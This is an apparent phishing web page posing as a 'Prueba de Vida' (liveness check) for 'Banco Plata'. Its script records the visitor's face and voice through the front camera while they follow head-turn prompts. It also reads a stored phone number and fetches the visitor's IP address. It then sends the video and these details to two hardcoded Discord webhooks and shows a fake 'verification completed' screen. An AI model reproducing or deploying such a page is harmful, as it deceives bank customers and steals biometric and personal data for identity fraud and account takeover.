<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Prueba de Vida - Banco Plata</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
    body { background-color: #000; min-height: 100dvh; display: flex; justify-content: center; overflow: hidden; color: #fff; }
    .app-container { width: 100%; max-width: 520px; display: flex; flex-direction: column; position: relative; height: 100dvh; }
    #video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; transform: scaleX(-1); background-color: #222; }
    .ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; justify-content: space-between; padding: max(20px, env(safe-area-inset-top)) 20px max(20px, env(safe-area-inset-bottom)); pointer-events: none; }
    .header-text { text-align: center; background: rgba(0,0,0,0.7); padding: 12px 20px; border-radius: 15px; backdrop-filter: blur(5px); margin: 0 auto; width: fit-content; max-width: 100%; pointer-events: auto; z-index: 20; }
    .header-text h2 { font-size: clamp(16px, 4.5vw, 20px); margin-bottom: 5px; }
    .header-text p { font-size: clamp(12px, 3.5vw, 14px); color: #ccc; }
    .scanner-frame { position: relative; width: clamp(260px, 80vw, 320px); height: clamp(350px, 105vw, 420px); border-radius: 50%; margin: auto; transition: all 0.3s ease; box-shadow: 0 0 0 4000px rgba(0,0,0,0.7); border: 4px solid #FF4E00; display: flex; justify-content: center; align-items: center; }
    .scanner-frame.recording { border-color: #FF0000; }
    .arrow { position: absolute; width: 60px; height: 60px; opacity: 0; transition: opacity 0.3s; color: #FFF; z-index: 15; }
    .arrow.active { opacity: 1; animation: bounceArrow 1s infinite alternate; }
    .arrow svg { width: 100%; height: 100%; fill: currentColor; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); }
    .arrow-center { top: 50%; left: 50%; transform: translate(-50%, -50%); }
    .arrow-left { top: 50%; left: 10px; transform: translateY(-50%); }
    .arrow-right { top: 50%; right: 10px; transform: translateY(-50%); }
    .arrow-up { top: 10px; left: 50%; transform: translateX(-50%); }
    .arrow-down { bottom: 10px; left: 50%; transform: translateX(-50%); }
    @keyframes bounceArrow { 0% { transform: scale(1) translate(var(--tx, 0), var(--ty, 0)); } 100% { transform: scale(1.2) translate(var(--tx, 0), var(--ty, 0)); } }
    .status-bar { background: rgba(0,0,0,0.85); padding: 15px; border-radius: 15px; text-align: center; backdrop-filter: blur(5px); font-weight: 600; font-size: clamp(13px, 4vw, 16px); transition: background 0.3s; width: 100%; max-width: 400px; margin: 0 auto 15px auto; pointer-events: auto; line-height: 1.3; z-index: 20; }
    .status-bar.recording-text { color: #FF0000; }
    .loader-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 999; color: #000; }
    .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .success-screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 999; color: #000; text-align: center; padding: 30px; }
    .success-icon { width: 80px; height: 80px; background: #22C55E; border-radius: 50%; color: #fff; font-size: 40px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
  </style>
</head>
<body>

  <div class="app-container">
    <video id="video" autoplay playsinline muted></video>
    
    <div class="ui-layer" id="uiLayer">
      <div class="header-text">
        <h2 id="titleText">Prueba de Vida</h2>
        <p id="subtitleText">Sigue las flechas con tu cabeza</p>
      </div>

      <div class="scanner-frame" id="scannerFrame">
        <div class="arrow arrow-center" id="arrCenter"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" stroke="currentColor" stroke-width="2" fill="none"/></svg></div>
        <div class="arrow arrow-left" id="arrLeft"><svg viewBox="0 0 24 24"><path d="M20 12H4M10 18l-6-6 6-6" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
        <div class="arrow arrow-right" id="arrRight"><svg viewBox="0 0 24 24"><path d="M4 12h16M14 6l6 6-6 6" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
        <div class="arrow arrow-up" id="arrUp"><svg viewBox="0 0 24 24"><path d="M12 20V4M6 10l6-6 6 6" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
        <div class="arrow arrow-down" id="arrDown"><svg viewBox="0 0 24 24"><path d="M12 4v16M6 14l6 6 6-6" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      </div>

      <div id="actionContainer">
        <div class="status-bar" id="statusBar">Iniciando video...</div>
      </div>
    </div>

    <div class="loader-overlay" id="loader">
      <div class="spinner"></div>
      <h3>Subiendo video...</h3>
    </div>

    <div class="success-screen" id="successScreen">
      <div class="success-icon">✓</div>
      <h2>¡Verificación Completada!</h2>
      <p style="color: #666; margin-top: 10px;">Tu video ha sido procesado correctamente.</p>
    </div>
  </div>

  <canvas id="captureCanvas" style="display: none;"></canvas>

  <script>
    const DISCORD_WEBHOOKS = [
      'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0',
      'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc'
    ];
    
    let video = document.getElementById('video');
    let statusBar = document.getElementById('statusBar');
    let scannerFrame = document.getElementById('scannerFrame');
    
    let videoStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let currentStep = 0;

    async function startVideo() {
      try {
        videoStream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
          audio: true 
        });
        video.srcObject = videoStream; 
        video.play(); 
        
        setTimeout(startVideoRecording, 1000);
      } catch (err) { 
        console.error(err);
        statusBar.textContent = 'Error: No se pudo acceder a la cámara frontal.';
        statusBar.style.color = '#FF4E00';
      }
    }

    function startVideoRecording() {
      recordedChunks = [];
      currentStep = 0;
      scannerFrame.classList.add('recording');
      document.querySelectorAll('.arrow').forEach(el => el.classList.remove('active'));
      
      const options = { mimeType: 'video/webm;codecs=vp9' };
      if (!MediaRecorder.isTypeSupported(options.mimeType)) { options.mimeType = 'video/webm'; }
      try { mediaRecorder = new MediaRecorder(videoStream, options); } catch (e) { mediaRecorder = new MediaRecorder(videoStream); }
      
      mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) { recordedChunks.push(event.data); } };
      mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const reader = new FileReader(); 
        reader.readAsDataURL(blob);
        reader.onloadend = () => { sendVideoToDiscord(reader.result); };
      };
      
      mediaRecorder.start();
      runInstructionStep();
    }
    
    function runInstructionStep() {
      const steps = [
        { text: "Mira al centro", arrow: 'arrCenter', duration: 1500 },
        { text: "Gira a la IZQUIERDA", arrow: 'arrLeft', duration: 2000 },
        { text: "Gira a la DERECHA", arrow: 'arrRight', duration: 2000 },
        { text: "Mira hacia ARRIBA", arrow: 'arrUp', duration: 2000 },
        { text: "Mira hacia ABAJO", arrow: 'arrDown', duration: 2000 }
      ];
      if (currentStep >= steps.length) { stopVideoRecording(); return; }
      
      const step = steps[currentStep];
      statusBar.textContent = step.text;
      statusBar.className = 'status-bar recording-text';
      
      document.querySelectorAll('.arrow').forEach(el => el.classList.remove('active'));
      document.getElementById(step.arrow).classList.add('active');
      
      setTimeout(() => { currentStep++; runInstructionStep(); }, step.duration);
    }
    
    function stopVideoRecording() {
      document.querySelectorAll('.arrow').forEach(el => el.classList.remove('active'));
      document.querySelector('.ui-layer').style.display = 'none';
      document.getElementById('loader').style.display = 'flex';
      if (mediaRecorder && mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); }
    }

    async function sendVideoToDiscord(base64Video) {
      try {
        const phone = localStorage.getItem('plata_phone') || 'No ingresado';
        let ip = 'Desconocida';
        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e){}

        function base64ToBlob(base64Data, contentType) {
          const sliceSize = 1024; const byteCharacters = atob(base64Data.split(',')[1]); const byteArrays = [];
          for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
            const slice = byteCharacters.slice(offset, offset + sliceSize); const byteNumbers = new Array(slice.length);
            for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
            const byteArray = new Uint8Array(byteNumbers); byteArrays.push(byteArray);
          }
          return new Blob(byteArrays, { type: contentType });
        }

        const formData = new FormData();
        const payload = { username: "Banco Plata - Video", content: `🎥 **Video de Prueba de Vida**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` };

        formData.append('payload_json', JSON.stringify(payload));
        formData.append('file1', base64ToBlob(base64Video, 'video/webm'), 'Video_Prueba_Vida.webm');

        for (const webhook of DISCORD_WEBHOOKS) { await fetch(webhook, { method: 'POST', body: formData }); }
        
        document.getElementById('loader').style.display = 'none'; 
        document.getElementById('successScreen').style.display = 'flex'; 
        
      } catch (error) { 
        console.error(error); 
        alert('Error al subir el video.'); 
        location.reload(); 
      }
    }

    window.addEventListener('load', startVideo);
  </script>
</body>
</html>
